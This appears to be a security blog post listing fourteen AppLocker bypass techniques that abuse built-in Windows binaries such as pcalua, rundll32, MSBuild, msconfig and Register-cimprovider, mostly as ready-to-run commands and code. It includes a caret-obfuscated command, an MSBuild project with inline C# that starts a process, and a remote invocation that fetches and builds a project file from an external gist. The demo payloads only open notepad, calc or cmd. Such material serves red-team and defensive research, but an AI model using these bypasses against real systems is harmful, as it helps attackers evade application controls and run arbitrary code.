---
title: AppLockerList
date: 2020-03-10 19:39:36
tags: windows
categories: windows
---
![enter description here][1]
<!--more-->
## 1.pcalua.exe:>

```
p^c^a^l^u^a^ ^-^n^ ^-^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a
^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a
^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a
^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a
^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a
^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a
^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a
^a^a^a^a^a^a^a^a^^a^a^a^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^
n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^n^a^n^a
^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n
^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a
^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n
^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n notepad.exe
```

![enter description here][2]

![enter description here][3]
&nbsp;




## 2.Language LUA in Files .wlua:>

![enter description here][4]
&nbsp;



## 3.INF-SCT

``` stylus
rundll32.exe advpack.dll,LaunchINFSection  c:\test.inf,DefaultInstall_SingleUser,1,
```



![enter description here][5]




https://twitter.com/bohops/status/967486047839014913

https://gist.githubusercontent.com/bohops/693dd4d5dbfb500f1c3ace02622d5d34/raw/902ed953a9188b27e91c199b465cddf855c7b94f/test.inf

https://github.com/homjxi0e/AppLockerBPG
&nbsp;

## 4.MSBuild.exe
![enter description here][6]

![enter description here][7]

``` stylus
Local Invocation
================
[Reflection.Assembly]::LoadWithPartialName('Microsoft.Build');
$proj = "c:\test\test.csproj";
$e=new-object Microsoft.Build.Evaluation.Project($proj);
$e.Build();
or
Add-Type -Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Build.dll"
$proj = "c:\test\test.csproj";
$e=new-object Microsoft.Build.Evaluation.Project($proj);
$e.Build();
Remote Invocation
=================
[Reflection.Assembly]::LoadWithPartialName('Microsoft.Build');
$proj = [System.Xml.XmlReader]::create("https://gist.githubusercontent.com/bohops/a29a69cf127ffb0e37622d25b9f79157/raw/35fa4c5a0d2db037220f224b5c4c269ea243b3bd/test.csproj");
$e=new-object Microsoft.Build.Evaluation.Project($proj);
$e.Build();
or
Add-Type -Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Build.dll"
$proj = [System.Xml.XmlReader]::create("https://gist.githubusercontent.com/bohops/a29a69cf127ffb0e37622d25b9f79157/raw/35fa4c5a0d2db037220f224b5c4c269ea243b3bd/test.csproj");
$e=new-object Microsoft.Build.Evaluation.Project($proj);
$e.Build();
```



``` stylus
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
   <FragmentExample />
   <ClassExample />
  </Target>
  <UsingTask
    TaskName="FragmentExample"
    TaskFactory="CodeTaskFactory"
 AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <ParameterGroup/>
    <Task>
      <Using Namespace="System" />  
      <Code Type="Fragment" Language="cs">
        <![CDATA[		
        ]]>
      </Code>
    </Task>
	</UsingTask>
	<UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
	<Task>
	<!-- <Reference Include="System.IO" /> Example Include -->		
      <Code Type="Class" Language="cs">
        <![CDATA[
			using System;
			using System.Diagnostics;
			using Microsoft.Build.Framework;
			using Microsoft.Build.Utilities;
				
			public class ClassExample :  Task, ITask
			{
				public override bool Execute()
				{
                    System.Diagnostics.Process proc = new System.Diagnostics.Process();
                    proc.StartInfo.FileName = "c:\\windows\\system32\\notepad.exe";
                    proc.Start();						
					return true;
				}
			}
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

https://twitter.com/bohops/status/971026915736899585
https://gist.github.com/bohops/a29a69cf127ffb0e37622d25b9f79157

##  5.bypassUAC- inf
https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec


![enter description here][8]




## 6.rundll32.exe
![enter description here][9]

![enter description here][10]


## 7.ATPSJScript
https://gist.github.com/homjxi0e/0d683007bd4a3ce39d3e19342aaa68ec
![enter description here][11]

## 8.Reflection.Assembly

``` stylus
PS C:\Users\demon>    $RAS = Join-Path -Path c:\windows\system32\ -ChildPath 
calc.exe


PS C:\Users\demon>   [Reflection.Assembly]::LoadWithPartialName
('Microsoft.VisualBasic');[Microsoft.VisualBasic.Interaction]::Shell("$RAS","0");
```


![enter description here][12]


## 9.rundll32
``` stylus
rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication calc.exe
```

 

``` stylus
rundll32.exe shell32.dll,ShellExec_RunDLL  C:\Windows\System32\cmd.exe
```


 
![enter description here][13]



## 10.sigverif.exe

http://www.hexacorn.com/blog/2018/04/27/i-shot-the-sigverif-exe-the-gui-based-lolbin/

<div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div>
<script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script>
<script>
    var ivaInstance = new Iva('ivaLive', {
        appkey: 'By9WGzBIx', //应用标示
        video: 'http://demonsec666.oss-cn-qingdao.aliyuncs.com/sigverif.mp4', //视频
        title: 'test', //视频标题，后台视频管理中的标题
        cover: '' //视频封面，只有在autoplay:false才可生效
    });
</script>
<script src="//cytroncdn.videojj.com/latest/Iva.js"></script>





## 11.msconfig
``` vbscript-html
<?xml  version="1.0" ?>
<MSCONFIGTOOLS>
<a NAME="LOLBin" PATH="%windir%\system32\WindowsPowerShell\v1.0\powershell.exe"
DEFAULT_OPT="-command calc.exe " 
HELP="LOLBin MSCONFIGTOOLS"/>
</MSCONFIGTOOLS>
```
![enter description here][14]
1. 讲上述代码 写为mscfgtlc.xml  放置路径为C:\Windows\System32

2.启动CMD ：msconfig -5

3. 找到LOLBin一栏 点击启动 触发条件
https://twitter.com/pabraeken/status/991314564896690177



## 12.DXCap.exe
``` stylus
DXCap.exe -c C:\Windows\System32\notepad.exe
```

https://twitter.com/harr0ey/status/992008180904419328

![enter description here][15]



## 13.Register-cimprovider.exe
``` tex
Register-cimprovider -path "C:\folder\evil.dll"   
```
https://github.com/api0cradle/LOLBAS/blob/master/OSBinaries/Register-cimprovider.md
![enter description here][16]

## 14.COMHijacking18.reg

``` stylus
$COMobj = [activator]::CreateInstance([type]::GetTypeFromCLSID("{00020000-0000-0000-C000-000000000046}"));$COMobj.Exec();
```
https://gist.github.com/homjxi0e/40f30c3be62c6ef152d6f6fffa9dba3c
https://twitter.com/harr0ey/status/993778424853549056
![enter description here][17]


  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/796F464239A249C20031545D2E441C5E.jpg
  [2]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1520684757640.jpg
  [3]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/Cache_1b2d7021fd334132..jpg
  [4]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/Cache_-142521484f69bba1..jpg
  [5]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1520695246464.jpg
  [6]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/B18E7C8A823838321225F2D38477D618.jpg
  [7]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1DAE31B177A02BDC202AD0FE2C5D9298.jpg
  [8]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/73C5C696FC0B1C87E9B1DF9924048DFF.jpg
  [9]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/83309E1B1069CA79F74AABCCD5AEAA3D.jpg
  [10]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/6C99AF94C094ECF589F84CBE22769C61.jpg
  [11]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1521117181892.jpg
  [12]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/6400B060F225D9AEAFBB66F93CCEA2FF.jpg
  [13]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/30BD1EBA-BB5C-4FDE-AEFB-7F6629A7A70E.png
  [14]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/4EF4BB29-4BDF-4265-A9A5-FF62C278A234.png
  [15]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/493ABA67CD0EE259E6ACE72AF3F18BB0.png
  [16]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/A68A0BB2F11D180A4A7D2361BB1BD4CF.jpg
  [17]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/8B3C3B183E825865750E06B5F4A83BD9.png 